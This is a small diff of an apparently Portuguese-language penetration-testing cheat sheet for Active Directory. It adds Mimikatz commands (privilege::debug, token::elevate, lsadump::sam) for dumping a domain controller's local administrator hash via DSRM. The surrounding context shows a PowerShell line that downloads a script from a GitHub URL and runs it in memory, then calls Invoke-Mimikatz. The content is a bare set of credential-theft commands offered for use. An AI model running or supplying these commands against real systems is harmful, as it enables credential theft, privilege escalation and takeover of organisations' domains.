@@ -1506,9 +1506,13 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 Invoke-Mimikatz
 ```
 ##### DSRM MIMIKATZ - OBTER HASH DO ADMINITRADOR LOCAL NO DC(COMO ADMIN):
+PRIVILEGE PRIMEIRO E TOKEN DEPOIS, ESSA EU NÃO SABIA
 ```
-aaa
+privilege::debug
+token::elevate
+lsadump::sam
 ```
+
 
 
 
